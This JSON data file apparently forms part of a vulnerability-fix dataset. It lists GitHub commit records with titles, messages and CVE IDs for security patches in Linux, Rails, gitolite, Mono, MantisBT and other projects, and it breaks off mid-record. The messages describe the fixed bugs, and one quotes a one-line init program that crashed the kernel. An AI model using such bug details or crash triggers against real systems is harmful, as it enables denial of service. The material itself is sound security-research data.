{
  "03b292970b2a12e19483ba1b818643d7b955c3a4b4bed0668de034cd843b6b5e": {
    "url": "https://github.com/krb5/krb5/commit/cf1a0c411b2668c57c41e9c4efd15ba17b6b322c",
    "title": "Fix kpasswd UDP ping-pong [CVE-2002-2443]",
    "body": "The kpasswd service provided by kadmind was vulnerable to a UDP\"ping-pong\" attack [CVE-2002-2443]. Don't respond to packets unlessthey pass some basic validation, and don't respond to our own errorpackets.Some authors use CVE-1999-0103 to refer to the kpasswd UDP ping-pongattack or UDP ping-pong attacks in general, but there is discussionleading toward narrowing the definition of CVE-1999-0103 to the echo,chargen, or other similar built-in inetd services.Thanks to Vincent Danen for alerting us to this issue.CVSSv2: AV:N/AC:L/Au:N/C:N/I:N/A:P/E:P/RL:O/RC:Cticket: 7637 (new)target_version: 1.11.3tags: pullup",
    "cveIds": [
      "CVE-2002-2443"
    ],
    "cveIdsCount": 1
  },
  "c1e1b17e4b55ec8ed6f21e8822d7ffa9c56cbb6cfa41c1600a6eb675fc84d15a": {
    "url": "https://github.com/torvalds/linux/commit/4dcc29e1574d88f4465ba865ed82800032f76418",
    "title": "[IA64] Workaround for RSE issue",
    "body": "Problem: An application violating the architectural rules regardingoperation dependencies and having specific Register Stack Engine (RSE)state at the time of the violation, may result in an illegal operationfault and invalid RSE state. Such faults may initiate a cascade ofrepeated illegal operation faults within OS interruption handlers.The specific behavior is OS dependent.Implication: An application causing an illegal operation fault withspecific RSE state may result in a series of illegal operation faultsand an eventual OS stack overflow condition.Workaround: OS interruption handlers that switch to kernel backingstore implement a check for invalid RSE state to avoid the seriesof illegal operation faults.The core of the workaround is the RSE_WORKAROUND code sequenceinserted into each invocation of the SAVE_MIN_WITH_COVER andSAVE_MIN_WITH_COVER_R19 macros. This sequence includes hard-codedconstants that depend on the number of stacked physical registersbeing 96. The rest of this patch consists of code to disable thisworkaround should this not be the case (with the presumption thatif a future Itanium processor increases the number of registers, itwould also remove the need for this patch).Move the start of the RBS up to a mod32 boundary to avoid somecorner cases.The dispatch_illegal_op_fault code outgrew the spot it wassquatting in when built with this patch and CONFIG_VIRT_CPU_ACCOUNTING=yMove it out to the end of the ivt.Signed-off-by: Tony Luck <tony.luck@intel.com>",
    "cveIds": [
      "CVE-2006-3635"
    ],
    "cveIdsCount": 1
  },
  "261894c30a3cd35f373ac4aba53ddc553bc7f85574f0809c9d6e0a10b15936ec": {
    "url": "https://github.com/torvalds/linux/commit/0b29669c065f60501e7289e1950fa2a618962358",
    "title": "V4L/DVB (6751): V4L: Memory leak! Fix count in videobuf-vmalloc mmap",
    "body": "This is pretty serious bug. map->count is never initialized after thecall to kmalloc making the count start at some random trash value. Theend result is leaking videobufs.Also, fix up the debug statements to print unsigned values.Pushed to http://ifup.org/hg/v4l-dvb tooSigned-off-by: Brandon Philips <bphilips@suse.de>Signed-off-by: Mauro Carvalho Chehab <mchehab@infradead.org>",
    "cveIds": [
      "CVE-2007-6761"
    ],
    "cveIdsCount": 1
  },
  "bd64318ba0d92c5484f35c89961328a39dd34fe0101815d27252aec3ed88f50b": {
    "url": "https://github.com/torvalds/linux/commit/2a2f11c227bdf292b3a2900ad04139d301b56ac4",
    "title": "NetLabel: correct CIPSO tag handling when adding new DOI definitions",
    "body": "The current netlbl_cipsov4_add_common() function has two problems which arefixed with this patch. The first is an off-by-one bug where it is possibile tooverflow the doi_def->tags[] array. The second is a bug where the samedoi_def->tags[] array was not always fully initialized, which caused sporadicfailures.Signed-off-by: Paul Moore <paul.moore@hp.com>Signed-off-by: James Morris <jmorris@namei.org>",
    "cveIds": [
      "CVE-2007-6762"
    ],
    "cveIdsCount": 1
  },
  "0878631dd5be5709e46ea19a4c37e0c32d95bc3ed81dddb77d883a20ac4ea7db": {
    "url": "http://github.com/rails/rails/commit/7282ed863ca7e6f928bae9162c9a63a98775a19d",
    "title": "Sanitize the URLs passed to redirect_to to prevent a potential respon…",
    "body": "…se spliCGI.rb and mongrel don't do any sanitization of the contents of HTTP headers",
    "cveIds": [
      "CVE-2008-5189"
    ],
    "cveIdsCount": 1
  },
  "4b2fe73384179519feeb49a79ee53d43a929d5ae02d9339dcf3aa10d406763aa": {
    "url": "https://github.com/torvalds/linux/commit/124d3b7041f9a0ca7c43a6293e1cae4576c32fd5",
    "title": "fix writev regression: pan hanging unkillable and un-straceable",
    "body": "Frederik Himpe reported an unkillable and un-straceable pan process.Zero length iovecs can go into an infinite loop in writev, because theiovec iterator does not always advance over them.The sequence required to trigger this is not trivial. I think itrequires that a zero-length iovec be followed by a non-zero-length iovecwhich causes a pagefault in the atomic usercopy. This causes the writevcode to drop back into single-segment copy mode, which then tries tocopy the 0 bytes of the zero-length iovec; a zero length copy looks likea failure though, so it loops.Put a test into iov_iter_advance to catch zero-length iovecs. We couldjust put the test in the fallback path, but I feel it is more robust toskip over zero-length iovecs throughout the code (iovec iterator may beused in filesystems too, so it should be robust).Signed-off-by: Nick Piggin <npiggin@suse.de>Signed-off-by: Ingo Molnar <mingo@elte.hu>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2008-7316"
    ],
    "cveIdsCount": 1
  },
  "a357fe7e706de8ad9beb2efc897e73bf6c6293e4c8d2a33b020f9ac59e5158cc": {
    "url": "http://github.com/macournoyer/thin/commit/7bd027914c5ffd36bb408ef47dc749de3b6e063a",
    "title": "Fix Remote address spoofing vulnerability in Connection#remote_addres…",
    "body": "…s [Alexey Borzenkov]",
    "cveIds": [
      "CVE-2009-3287"
    ],
    "cveIdsCount": 1
  },
  "af487506c2835a269b644d98f8394e943bd20bdfc9a282d8c39f056a477d83a9": {
    "url": "http://github.com/gisle/html-parser/commit/b9aae1e43eb2c8e989510187cff0ba3e996f9a4c",
    "title": "decode_entities confused by trailing incomplete entity",
    "body": "Mark Martinec reported crashed when running SpamAssassin, given aparticular HTML junk mail to parse. The problem was caused byHTML::Parsers decode_entities function confusing itself when itencountered strings with incomplete entities at the end of the string.",
    "cveIds": [
      "CVE-2009-3627"
    ],
    "cveIdsCount": 1
  },
  "ab3c83e8fc795c682be61a9fe63aed47ebc7731994f8d2e3d8be910f5780238e": {
    "url": "http://github.com/rails/rails/commit/bfe032858077bb2946abe25e95e485ba6da86bd5",
    "title": "Make sure strip_tags removes tags which start with a non-printable ch…",
    "body": "…aracterSigned-off-by: Michael Koziarski <michael@koziarski.com>",
    "cveIds": [
      "CVE-2009-4214"
    ],
    "cveIdsCount": 1
  },
  "6b46d66e0fd2eb1716885cbe969d4b6155524eb93e4e9befee916b8371ccade3": {
    "url": "https://github.com/ruby/ruby/commit/4600cf725a86ce31266153647ae5aa1197b1215b",
    "title": "* ext/dl/dl.c (rb_dlhandle_initialize): prohibits DL::dlopen",
    "body": "with a tainted name of library. Patch by sheepman <sheepman AT sheepman.sakura.ne.jp>.* ext/dl/dl.c (rb_dlhandle_sym): dittogit-svn-id: svn+ssh://ci.ruby-lang.org/ruby/branches/ruby_1_9_1@23405 b2dd03c8-39d4-4d8f-98ff-823fe69b080e",
    "cveIds": [
      "CVE-2009-5147"
    ],
    "cveIdsCount": 1
  },
  "09786b604f952e499c9ce97794d486d76f68c74da0cc01aa00d0f5cd40c865c2": {
    "url": "http://github.com/ensc/irssi-proxy/commit/85bbc05b21678e80423815d2ef1dfe26208491ab",
    "title": "Check if an SSL certificate matches the hostname of the server we are…",
    "body": "… connecting togit-svn-id: http://svn.irssi.org/repos/irssi/trunk@5104 dbcabf3a-b0e7-0310-adc4-f8d773084564",
    "cveIds": [
      "CVE-2010-1155"
    ],
    "cveIdsCount": 1
  },
  "c12adc746b4f6d85431c4cfcbda3718b5089a807f659f31d0545563c2ad4f4f3": {
    "url": "https://github.com/sitaramc/gitolite/commit/5fd9328c1cd1e7c576b6530b3253061c68b159aa",
    "title": "\"accidental [mis]feature\" -- yet another admin->shell hole blocked!",
    "body": "This is a pretty big hole, really. Only the fact that Eli called it an\"accidental feature\" helped catch it :)Notes on the code:An explicit list of paths -- maybe just \"conf\", \"keydir\", and \"local\" --would have been easier, but this isn't too bad, I think.",
    "cveIds": [
      "CVE-2010-2447"
    ],
    "cveIdsCount": 1
  },
  "a8baf3b4a2ce6418368f4d00afb2085fdeeb316c80bdf5b77271674e83d14a68": {
    "url": "https://github.com/sitaramc/gitolite/commit/1e06fea3b6959faeb72d8dca46cd4753ada48637",
    "title": "(security) a different fix in place of 5fd9328",
    "body": "SECURITY NOTE: if you deleted or renamed a pubkey file after 5fd9328went in (April 12th), please: - upgrade asap, then - go to your latest gitolite-admin clone and \"git push -f\"Otherwise this is not urgent.5fd9328 (and its minor successor 813a2a9) were about preventing thegitolite admin from sneaking in files to src/ and hooks/ into$GL_ADMINDIR. It seemed easy enough to do this by converting thepath-less checkout to a with-paths checkout, but this has caused a worseproblem -- deleting a keydir/foo.pub now no longer has an effect; thefile still hangs around in the work tree.Ouch! (and thanks to teukka for noticing)We now do this check as a separate step, so the checkout can revert tobeing path-less.",
    "cveIds": [
      "CVE-2010-2447"
    ],
    "cveIdsCount": 1
  },
  "c2824e3526db80bd3874963f5fb71a488721ca8167a925c7105811ad0a020443": {
    "url": "https://github.com/sitaramc/gitolite/releases/tag/v1.4.1",
    "title": "",
    "body": "SECURITY NOTE: if you deleted or renamed a pubkey file after 5fd9328went in (April 12th), please: - upgrade asap, then - go to your latest gitolite-admin clone and \"git push -f\"Otherwise this is not urgent.5fd9328 (and its minor successor 813a2a9) were about preventing thegitolite admin from sneaking in files to src/ and hooks/ into$GL_ADMINDIR. It seemed easy enough to do this by converting thepath-less checkout to a with-paths checkout, but this has caused a worseproblem -- deleting a keydir/foo.pub now no longer has an effect; thefile still hangs around in the work tree.Ouch! (and thanks to teukka for noticing)We now do this check as a separate step, so the checkout can revert tobeing path-less.",
    "cveIds": [
      "CVE-2010-2447"
    ],
    "cveIdsCount": 1
  },
  "785f49ca84a3fa3587228de515299499f64409220178014d039f1afc00cd7548": {
    "url": "https://github.com/orbeon/orbeon-forms/commit/aba6681660f65af7f1676434da68c10298c30200",
    "title": "Implemented \"[ #315668 ] Disable loading of external entities in XML …",
    "body": "…parsing by default\".",
    "cveIds": [
      "CVE-2010-3260"
    ],
    "cveIdsCount": 1
  },
  "5933a813d4bc6b74b2c9b7ca13b558f1cf487043b88771fb90fd48d124f08199": {
    "url": "http://github.com/alandekok/freeradius-server/commit/ff94dd35673bba1476594299d31ce8293b8bd223",
    "title": "Do not delete \"old\" requests until they are free.",
    "body": "If the request is in the queue for 30+ seconds, do NOT delete it.Instead, mark it as \"STOP PROCESSING\", and do \"wait_for_child_to_die\",which waits for a child thread to pick it up, and acknowledge that it'sdone. Once it's marked done, we can finally clean it up.This may be the underlying issue behind bug FreeRADIUS#35",
    "cveIds": [
      "CVE-2010-3697"
    ],
    "cveIdsCount": 1
  },
  "873b76b4ef2c4d42f3082e8708e43a77be6a76a87be69ab4124154180a6d0c15": {
    "url": "https://github.com/railsdog/spree/commit/19944bd999c310d9b10d16a41f48ebac97dc4fac",
    "title": "SECURITY FIX: Do not allow access to REST API without valid token in …",
    "body": "…request header.See http://haacked.com/archive/2009/06/25/json-hijacking.aspx",
    "cveIds": [
      "CVE-2010-3978"
    ],
    "cveIdsCount": 1
  },
  "f65f8c59d6be69f218cb38465f29f5707a34f13d5e54af155109f3d568375c32": {
    "url": "https://github.com/railsdog/spree/commit/d881b2bb610ea33e2364ff16feb8e702dfeda135",
    "title": "SECURITY FIX: Do not allow GET access to JSON views without including…",
    "body": "… CSRF token.See http://haacked.com/archive/2009/06/25/json-hijacking.aspx",
    "cveIds": [
      "CVE-2010-3978"
    ],
    "cveIdsCount": 1
  },
  "617ce5cce9c9b3a2ffe0415cf7dc78e4490a28385e740a888088483f5458f87e": {
    "url": "https://github.com/torvalds/linux/commit/a2ae4cc9a16e211c8a128ba10d22a85431f093ab",
    "title": "inotify: stop kernel memory leak on file creation failure",
    "body": "If inotify_init is unable to allocate a new file for the new inotifygroup we leak the new group. This patch drops the reference on thegroup on file allocation failure.Reported-by: Vegard Nossum <vegard.nossum@gmail.com>cc: stable@kernel.orgSigned-off-by: Eric Paris <eparis@redhat.com>",
    "cveIds": [
      "CVE-2010-4250"
    ],
    "cveIdsCount": 1
  },
  "a1ca00703598081f4a2fc7d0b459adaa572728ad1eced8639eb5c4bec93ffcaa": {
    "url": "https://github.com/mono/mono/commit/65292a69c837b8a5f7a392d34db63de592153358",
    "title": "Handle invalid instantiation of generic methods.",
    "body": "* verify.c: Add new function to internal verifier API to checkmethod instantiations.* reflection.c (mono_reflection_bind_generic_method_parameters):Check the instantiation before returning it.Fixes #655847",
    "cveIds": [
      "CVE-2010-4254"
    ],
    "cveIdsCount": 1
  },
  "f4fec247069f02d7178b251d6084fbd385f1e40bf61fe60da800173851a5f0ae": {
    "url": "https://github.com/mono/mono/commit/cf1ec146f7c6acdc6697032b3aaafc68ffacdcac",
    "title": "Handle invalid instantiation of generic methods.",
    "body": "* verify.c: Add new function to internal verifier API to checkmethod instantiations.* reflection.c (mono_reflection_bind_generic_method_parameters):Check the instantiation before returning it.Fixes #655847",
    "cveIds": [
      "CVE-2010-4254"
    ],
    "cveIdsCount": 1
  },
  "a4ed83c0f2d23a0c265ed08eacffb9d3f86a97cbf7b6b417245f595b6635e7a6": {
    "url": "https://github.com/mono/mono/commit/4905ef1130feb26c3150b28b97e4a96752e0d399",
    "title": "Handle invalid instantiation of generic methods.",
    "body": "* verify.c: Add new function to internal verifier API to checkmethod instantiations.* reflection.c (mono_reflection_bind_generic_method_parameters):Check the instantiation before returning it.Fixes #655847",
    "cveIds": [
      "CVE-2010-4254"
    ],
    "cveIdsCount": 1
  },
  "752360d232f3e0f04da5bddbd21ea752aa73a411eb6fa27a2f13a72b99270cd3": {
    "url": "https://github.com/vanilla/vanilla/commit/4535a059e4e24ca11a2ef0b4d754f262398bcece",
    "title": "Fixed XSS vulnerability where filename could contain abitrary code to…",
    "body": "… execute on the client side.",
    "cveIds": [
      "CVE-2010-4264"
    ],
    "cveIdsCount": 1
  },
  "a12796e9e59c647ff5cac5e85cbe59cdabbda81cdd70d580f91352fa2cd79263": {
    "url": "https://github.com/cakephp/cakephp/commit/e431e86aa4301ced4273dc7919b59362cbb353cb",
    "title": "Fixing issue found by Felix Wilhelm(flxm) where users could send pote…",
    "body": "…ntially dangerous or corrupted serialized objects to SecurityComponent, potentially allowing manipulation of file map caches. Test case added.",
    "cveIds": [
      "CVE-2010-4335"
    ],
    "cveIdsCount": 1
  },
  "0bfa33c82469e6b855215324f0160147ee9ce5fa9743998be22e0d2cdeeb002c": {
    "url": "https://github.com/torvalds/linux/commit/7572777eef78ebdee1ecb7c258c0ef94d35bad16",
    "title": "fuse: verify ioctl retries",
    "body": "Verify that the total length of the iovec returned in FUSE_IOCTL_RETRYdoesn't overflow iov_length().Signed-off-by: Miklos Szeredi <mszeredi@suse.cz>CC: Tejun Heo <tj@kernel.org>CC: <stable@kernel.org> [2.6.31+]",
    "cveIds": [
      "CVE-2010-4650"
    ],
    "cveIdsCount": 1
  },
  "615d987e13fe88022d793cf340f4224d55f7a1267e274649375623346b0e1639": {
    "url": "https://github.com/jquery/jquery-ui/commit/7e9060c109b928769a664dbcc2c17bd21231b6f3",
    "title": "Dialog: Extract setting the title into a _title method, use .text() t…",
    "body": "…o prevent XSS. Fixes #6016 - Dialog: Title XSS Vulnerability.",
    "cveIds": [
      "CVE-2010-5312"
    ],
    "cveIdsCount": 1
  },
  "9ddddacdb5ac526b012bea1d145fbe460870973dca667bf7fd3755a991f4cf4c": {
    "url": "https://github.com/liferay/liferay-portal/commit/90c4e85a8f8135f069f3f05e4d54a77704769f91",
    "title": "LPS-27741 Add security by plugin context execution to template engines",
    "body": "- We have to initialize/destroy a new template context specific to each plugin (keyed by ClassLoader of the plugin)- Add/Replaced helper utilities to support classloading control (and access to classes/packages) within templates",
    "cveIds": [
      "CVE-2010-5327"
    ],
    "cveIdsCount": 1
  },
  "37ccb3eb53f8a712c4e0e1c1813f174128ec2d586054db8f46ca86dfb482f048": {
    "url": "https://github.com/torvalds/linux/commit/fa2755e20ab0c7215d99c2dc7c262e98a09b01df",
    "title": "INIT_TASK() should initialize ->thread_group list",
    "body": "The trivial /sbin/init doingint main(void){kill(0, SIGKILL)}crashes the kernel.This happens because __kill_pgrp_info(init_struct_pid) also sends SIGKILLto the swapper process which runs with the uninitialized ->thread_group.Change INIT_TASK() to initialize ->thread_group properly.Note: the real problem is that the swapper process must not be visible tosignals, see the next patch. But this change is right anyway and fixesthe crash.Reported-and-tested-by: Mathias Krause <mathias.krause@secunet.com>Signed-off-by: Oleg Nesterov <oleg@redhat.com>Cc: Cedric Le Goater <clg@fr.ibm.com>Cc: Dave Hansen <haveblue@us.ibm.com>Cc: Eric Biederman <ebiederm@xmission.com>Cc: Herbert Poetzl <herbert@13thfloor.at>Cc: Mathias Krause <Mathias.Krause@secunet.com>Acked-by: Roland McGrath <roland@redhat.com>Acked-by: Serge Hallyn <serue@us.ibm.com>Acked-by: Sukadev Bhattiprolu <sukadev@us.ibm.com>Signed-off-by: Andrew Morton <akpm@linux-foundation.org>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2010-5328"
    ],
    "cveIdsCount": 1
  },
  "aabf695c5157eeab140e3d4ea4f033330bac36acba37663adc7262da9c76ca66": {
    "url": "https://github.com/torvalds/linux/commit/f20011457f41c11edb5ea5038ad0c8ea9f392023",
    "title": "pids: init_struct_pid.tasks should never see the swapper process",
    "body": "\"statically initialize struct pid for swapper\" commit 820e45d says:Statically initialize a struct pid for the swapper process (pid_t == 0)and attach it to init_task. This is needed so task_pid(), task_pgrp()and task_session() interfaces work on the swapper process also.OK, but:- it doesn't make sense to add init_task.pids[].node into init_struct_pid.tasks[], and in fact this just wrong. idle threads are special, they shouldn't be visible on any global list. In particular do_each_pid_task(init_struct_pid) shouldn't see swapper. This is the actual reason why kill(0, SIGKILL) from /sbin/init (which starts with 0,0 special pids) crashes the kernel. The signal sent to pgid/sid == 0 must never see idle threads, even if the previous patch fixed the crash itself.- we have other idle threads running on the non-boot CPUs, see the next patch.Change INIT_STRUCT_PID/INIT_PID_LINK to create the empty/unhashedhlist_head/hlist_node. Like any other idle thread swapper can never exit,so detach_pid()->__hlist_del() is not possible, but we could changeINIT_PID_LINK() to set pprev = &next if needed.All we need is the valid swapper->pids[].pid == &init_struct_pid.Reported-by: Mathias Krause <mathias.krause@secunet.com>Signed-off-by: Oleg Nesterov <oleg@redhat.com>Cc: Cedric Le Goater <clg@fr.ibm.com>Cc: Dave Hansen <haveblue@us.ibm.com>Cc: Eric Biederman <ebiederm@xmission.com>Cc: Herbert Poetzl <herbert@13thfloor.at>Cc: Mathias Krause <Mathias.Krause@secunet.com>Acked-by: Roland McGrath <roland@redhat.com>Acked-by: Serge Hallyn <serue@us.ibm.com>Cc: Sukadev Bhattiprolu <sukadev@us.ibm.com>Signed-off-by: Andrew Morton <akpm@linux-foundation.org>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2010-5328"
    ],
    "cveIdsCount": 1
  },
  "e9707da801fbdeb345e2ad2d4a19a98bcbf85659cdb3370f808006243cd1e1ce": {
    "url": "https://github.com/torvalds/linux/commit/f106eee10038c2ee5b6056aaf3f6d5229be6dcdd",
    "title": "pids: fix fork_idle() to setup ->pids correctly",
    "body": "copy_process(pid => &init_struct_pid) doesn't do attach_pid/etc.It shouldn't, but this means that the idle threads run with the wrongpids copied from the caller's task_struct. In x86 case the caller iseither kernel_init() thread or keventd.In particular, this means that after the series of cpu_up/cpu_down anidle thread (which never exits) can run with .pid pointing to nowhere.Change fork_idle() to initialize idle->pids[] correctly. We only set.pid = &init_struct_pid but do not add .node to list, INIT_TASK() doesthe same for the boot-cpu idle thread (swapper).Signed-off-by: Oleg Nesterov <oleg@redhat.com>Cc: Cedric Le Goater <clg@fr.ibm.com>Cc: Dave Hansen <haveblue@us.ibm.com>Cc: Eric Biederman <ebiederm@xmission.com>Cc: Herbert Poetzl <herbert@13thfloor.at>Cc: Mathias Krause <Mathias.Krause@secunet.com>Acked-by: Roland McGrath <roland@redhat.com>Acked-by: Serge Hallyn <serue@us.ibm.com>Cc: Sukadev Bhattiprolu <sukadev@us.ibm.com>Signed-off-by: Andrew Morton <akpm@linux-foundation.org>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2010-5328"
    ],
    "cveIdsCount": 1
  },
  "4fc91d1ea8b7c21cbe66f6abb5d7bb56728da9191485291f1790f9f6d3913737": {
    "url": "https://github.com/torvalds/linux/commit/fc0a80798576f80ca10b3f6c9c7097f12fd1d64e",
    "title": "[media] v4l: Share code between video_usercopy and video_ioctl2",
    "body": "The two functions are mostly identical. They handle the copy_from_userand copy_to_user operations related with V4L2 ioctls and call the realioctl handler.Create a __video_usercopy function that implements the core ofvideo_usercopy and video_ioctl2, and call that function from both.Signed-off-by: Laurent Pinchart <laurent.pinchart@ideasonboard.com>Acked-by: Hans Verkuil <hverkuil@xs4all.nl>Signed-off-by: Mauro Carvalho Chehab <mchehab@redhat.com>",
    "cveIds": [
      "CVE-2010-5329"
    ],
    "cveIdsCount": 1
  },
  "17b258ebe8a3e538d682c05652c944762b0b10ea58d052a6ba5a99422aa599ef": {
    "url": "https://github.com/torvalds/linux/commit/0926f91083f34d047abc74f1ca4fa6a9c161f7db",
    "title": "mlx4_en: Fix out of bounds array access",
    "body": "When searching for a free entry in either mlx4_register_vlan() ormlx4_register_mac(), and there is no free entry, the loop terminates withoutupdating the local variable free thus causing out of array bounds access. Fixthis by adding a proper check outside the loop.Signed-off-by: Eli Cohen <eli@mellanox.co.il>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2010-5332"
    ],
    "cveIdsCount": 1
  },
  "b747fd1e3ed779578fcfb869006f05540b150e7f0ef015edd94c7d217fa813b3": {
    "url": "https://github.com/torvalds/linux/commit/867c20265459d30a01b021a9c1e81fb4c5832aa9",
    "title": "ima: fix add LSM rule bug",
    "body": "If security_filter_rule_init() doesn't return a rule, then not everythingis as fine as the return code implies.This bug only occurs when the LSM (eg. SELinux) is disabled at runtime.Adding an empty LSM rule causes ima_match_rules() to always succeed,ignoring any remaining rules. default IMA TCB policy: # PROC_SUPER_MAGIC dont_measure fsmagic=0x9fa0 # SYSFS_MAGIC dont_measure fsmagic=0x62656572 # DEBUGFS_MAGIC dont_measure fsmagic=0x64626720 # TMPFS_MAGIC dont_measure fsmagic=0x01021994 # SECURITYFS_MAGIC dont_measure fsmagic=0x73636673 < LSM specific rule > dont_measure obj_type=var_log_t measure func=BPRM_CHECK measure func=FILE_MMAP mask=MAY_EXEC measure func=FILE_CHECK mask=MAY_READ uid=0Thus without the patch, with the boot parameters 'tcb selinux=0', addingthe above 'dont_measure obj_type=var_log_t' rule to the default IMA TCBmeasurement policy, would result in nothing being measured. The patchprevents the default TCB policy from being replaced.Signed-off-by: Mimi Zohar <zohar@us.ibm.com>Cc: James Morris <jmorris@namei.org>Acked-by: Serge Hallyn <serge.hallyn@canonical.com>Cc: David Safford <safford@watson.ibm.com>Cc: <stable@kernel.org>Signed-off-by: Andrew Morton <akpm@linux-foundation.org>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2011-0006"
    ],
    "cveIdsCount": 1
  },
  "9a688cb1a392f9701528d0dfa354a45f821acef0647b0be07453743a84e39f14": {
    "url": "https://github.com/openSUSE/open-build-service/commit/23c8d21c75242999e29379e6ca8418a14c8725c6",
    "title": "[backend] verify file names return by source service (do not allow fi…",
    "body": "…les with new lines #679151)",
    "cveIds": [
      "CVE-2011-0469"
    ],
    "cveIdsCount": 1
  },
  "d2943251f29e19f700a0cb5bbbddfd53ab01488d3ac03d3751cae2863978b980": {
    "url": "https://github.com/yoe/nbd/commit/3ef52043861ab16352d49af89e048ba6339d6df8",
    "title": "Fix buffer size checking",
    "body": "Yes, this means we've re-introduced CVE-2005-3534. Sigh.",
    "cveIds": [
      "CVE-2011-0530"
    ],
    "cveIdsCount": 1
  },
  "c01d0ce5428d43a170db28c643ce0d6c09026dcbf2366002cd4a46d47e94ae4f": {
    "url": "https://github.com/torvalds/linux/commit/6b0d6a9b4296fa16a28d10d416db7a770fc03287",
    "title": "bridge: Fix mglist corruption that leads to memory corruption",
    "body": "The list mp->mglist is used to indicate whether a multicast groupis active on the bridge interface itself as opposed to one of theconstituent interfaces in the bridge.Unfortunately the operation that adds the mp->mglist node to thelist neglected to check whether it has already been added. Thisleads to list corruption in the form of nodes pointing to itself.Normally this would be quite obvious as it would cause an infiniteloop when walking the list. However, as this list is never actuallywalked (which means that we don't really need it, I'll get rid ofit in a subsequent patch), this instead is hidden until we performa delete operation on the affected nodes.As the same node may now be pointed to by more than one node, thedelete operations can then cause modification of freed memory.This was observed in practice to cause corruption in 512-byte slabs,most commonly leading to crashes in jbd2.Thanks to Josef Bacik for pointing me in the right direction.Reported-by: Ian Page Hands <ihands@redhat.com>Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2011-0716"
    ],
    "cveIdsCount": 1
  },
  "18eda852349027c4af56475086edd59a6b3c0fcb9c24e368623b214b25e01122": {
    "url": "https://github.com/mono/mono/commit/3f8ee42b8c867d9a4c18c22657840d072cca5c3a",
    "title": "Don't use finalization to cleanup dynamic methods.",
    "body": "* reflection.c: Use a reference queue to cleanup dynamic methods instead of finalization. * runtime.c: Shutdown the dynamic method queue before runtime cleanup begins. * DynamicMethod.cs: No longer finalizable. * icall-def.h: Remove unused dynamic method icall. Fixes #660422 Implement a reference queue API. * gc.c: A reference queue allows one to queue callbcks for when objects are collected. It allows for safe cleanup of objects that can only be done when it is effectively collected. The major difference with regular finalization is that the collector makes sure the object was collected - and can't be resurrected. * gc-internal.h: Export entrypoints for the new API.",
    "cveIds": [
      "CVE-2011-0991"
    ],
    "cveIdsCount": 1
  },
  "e34be632bbbc290a9b962d595825951e7efed63221c4675e396b6400d32ba71d": {
    "url": "https://github.com/mantisbt/mantisbt/commit/317f3db3a3c68775de3acf3b15f55b1e3c18f93b",
    "title": "Fix #13245: XSS issues with search.php parameters",
    "body": "Net.Edit0r (Net.Edit0r@Att.net) from BlACK Hat Group[http://black-hg.org] posted a vulnerability report for an XSS issue insearch.php for MantisBT 1.2.6.The full report is available athttp://packetstormsecurity.org/files/104149filter_api.php is the culprit for this vulnerability as it passes usersupplied search parameters back into output without first escaping thevalues.It should be noted that numerous other XSS vulnerabilities (all related)have been fixed with this patch. In other words, it is not just theproject_id parameter to search.php that was affected - it was numerousother parameters/fields as well.The second SQL injection vulnerability identified by Net.Edit0r isinvalid because the only time we ever make reference to \"mbadmin\" in thesource code is:core.php:if ( file_exists( 'mantis_offline.php' ) && !isset( $_GET['mbadmin'] ) )This usage is safe because nothing is ever done with $_GET['mbadmin'].It may be the case that the user's customised version ofmantis_offline.php was incorrectly dumping the value of $_GET['mbadmin']to the screen. The default/sample mantis_offline.php has been checkedand does not print any dynamically created strings/user supplied values.",
    "cveIds": [
      "CVE-2011-2938"
    ],
    "cveIdsCount": 1
  },
  "261d33367ada288fd97916cbeff27eb74268cb2e27f47117a7d655a7876a55c0": {
    "url": "https://github.com/yast/yast-core/commit/7fe2e3df308b8b6a901cb2cfd60f398df53219de",
    "title": "- ini-agent: added Write(.section_private.SECTION, BOOLEAN) (bnc#7136…",
    "body": "…61, CVE-2011-3177)- system agent: added Write(.target.string, [filename, mode], content)svn merge -r66758:66764 http://svn.opensuse.org/svn/yast/branches/SuSE-Code-11-SP2-Branch/coresvn path=/trunk/core/; revision=67117",
    "cveIds": [
      "CVE-2011-3177"
    ],
    "cveIdsCount": 1
  },
  "2ca5a504e2c151162a2e27a51ac5b7de2cb191adf8cb33241da032bd4a0b7d21": {
    "url": "https://github.com/torvalds/linux/commit/9438fabb73eb48055b58b89fc51e0bc4db22fabd",
    "title": "cifs: fix possible memory corruption in CIFSFindNext",
    "body": "The name_len variable in CIFSFindNext is a signed int that gets set tothe resume_name_len in the cifs_search_info. The resume_name_len howeveris unsigned and for some infolevels is populated directly from a 32 bitvalue sent by the server.If the server sends a very large value for this, then that value couldlook negative when converted to a signed int. That would make thatvalue pass the PATH_MAX check later in CIFSFindNext. The name_len wouldthen be used as a length value for a memcpy. It would then be treatedas unsigned again, and the memcpy scribbles over a ton of memory.Fix this by making the name_len an unsigned value in CIFSFindNext.Cc: <stable@kernel.org>Reported-by: Darren Lavender <dcl@hppine99.gbr.hp.com>Signed-off-by: Jeff Layton <jlayton@redhat.com>Signed-off-by: Steve French <sfrench@us.ibm.com>",
    "cveIds": [
      "CVE-2011-3191"
    ],
    "cveIdsCount": 1
  },
  "2ebf903fcd51df83b51e72c35cd7317c35a48aba04f348b7283de96cd957c59f": {
    "url": "https://github.com/torvalds/linux/commit/f8bd2258e2d520dff28c855658bd24bdafb5102d",
    "title": "remove div_long_long_rem",
